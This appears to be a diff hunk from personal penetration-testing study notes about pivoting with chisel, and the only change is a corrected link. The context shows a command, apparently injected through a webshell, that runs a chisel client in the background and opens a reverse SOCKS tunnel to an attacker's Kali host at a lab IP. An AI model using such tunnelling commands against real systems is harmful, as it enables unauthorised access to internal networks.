@@ -100,7 +100,7 @@ We want the client to connect to our *chisel server on the Kali box* (`192.168.1
 /tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
 ```
 - `>/dev/null 2>&1` redirects all *output* to `/dev/null` which doesn't exist
-	- There is a better way to do the same thing which is less confusing, that is `...R:socks &> /dev/null` (see [file descriptors](../../computers/linux/file-descriptor.md))
+	- There is a better way to do the same thing which is less confusing, that is `...R:socks &> /dev/null` (see [file descriptors](../../computers/linux/file-system/file-descriptor.md))
 - `&` (at the end) will force the process *to run in the background*. This ensures our injection doesn't *hang while waiting for the process to finish*
 #### Character Encode for Webshell
 ```bash
